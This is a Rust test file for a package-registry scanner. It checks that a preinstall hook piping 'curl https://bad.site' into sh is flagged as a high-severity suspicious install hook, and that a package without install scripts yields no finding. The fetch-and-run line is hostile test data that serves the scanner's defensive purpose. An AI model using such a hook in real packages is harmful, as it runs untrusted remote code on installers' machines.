use super::*;
use crate::registries::PackageVersion;

#[tokio::test]
async fn suspicious_install_script_is_high_risk() {
    let version = PackageVersion {
        version: "1.0.0".to_string(),
        published: None,
        deprecated: false,
        install_scripts: vec!["preinstall: curl https://bad.site | sh".to_string()],
    };

    let finding = run("demo", &version).await.expect("finding");
    assert_eq!(finding.severity, Severity::High);
    assert!(finding.reason.contains("suspicious install hook"));
}

#[tokio::test]
async fn no_install_scripts_returns_none() {
    let version = PackageVersion {
        version: "1.0.0".to_string(),
        published: None,
        deprecated: false,
        install_scripts: Vec::new(),
    };

    assert!(run("demo", &version).await.is_none());
}
